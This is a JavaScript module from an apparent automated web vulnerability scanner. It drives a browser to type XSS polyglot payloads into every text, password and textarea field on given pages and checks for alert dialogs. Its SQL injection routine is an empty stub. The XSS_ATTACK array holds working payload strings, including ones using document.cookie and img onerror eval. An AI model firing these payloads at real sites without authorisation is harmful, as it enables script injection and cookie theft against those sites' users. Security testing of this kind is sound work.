const WebDriver = require('../utils/WebDriver')
const sleep = require('system-sleep')

const XSS_ATTACK = [
	'\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
	'\'\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\></|\><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->\"></script><script>alert(document.cookie)</script>\"><img/id=\"confirm&lpar;1)\"/alt=\"/\"src=\"/\"onerror=eval(id)>\'\"><img src=\"http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg\">',
]

module.exports = class XSSAndSQLIn {
	constructor(settings, urls) {
		this.settings = settings
		this.urls = urls
		//[xss, sqlin]
		//url with writable elements
		this.webDriver = new WebDriver()
	}

	start() {
		(this.urls).forEach((item) => {
			if (this.settings[0]) {
				//test xss
				this._xssOnPage(item[0])
			}
			if (this.settings[1]) {
				//test sqlin
				this._sqlInOnPage(item[0])
			}
		})
		this.webDriver.closeDriver()
	}

	_xssOnPage(page) {

		const tmpFolderPath = 'C:\Users\jakub.loffelmann\Desktop\img'
		console.log(['Starting xss attack on', page].join(' '))

		this.webDriver.goTo(page)
		sleep(1)

		let getCountOfWritableEl = function execute() {
			let selector = 'input[type="text"], input[type="password"], textarea'
			return document.querySelectorAll(selector).length
		}

		let testElement = function execute(params) {
			let selector = 'input[type="text"], input[type="password"], textarea'
			let element = document.querySelectorAll(selector)[params[0]]
			// element.setAttribute('value', params[1])
			// element.click()
			function getPathTo(element) {
				if (element.id !== '')
					return 'id("' + element.id + '")'
				if (element === document.body)
					return element.tagName

				let ix = 0
				let siblings = element.parentNode.childNodes
				for (let i = 0; i < siblings.length; i++) {
					let sibling = siblings[i]
					if (sibling === element)
						return getPathTo(element.parentNode) + '/' + element.tagName + '[' + (ix + 1) + ']'
					if (sibling.nodeType === 1 && sibling.tagName === element.tagName)
						ix++
				}
			}
			return getPathTo(element)
		}

		let elCount = this.webDriver.executeScript(getCountOfWritableEl)

		for (let i = 0; i < elCount; i++) {
			let attack = XSS_ATTACK[1]
			//console.log(attack)
			this.webDriver.goTo(page)
			let xPath = this.webDriver.executeScript(testElement, [i, attack])
			this.webDriver.sendKeys(xPath, attack)
			// sleep(5000000)
			while (this.webDriver.testAlertPresentAndClose()) {
				console.log('MAYBE XSS.........')
			}
		}
	}

	_sqlInOnPage(page) {
		console.log(['Starting sql injection attack on', page].join(' '))
	}
}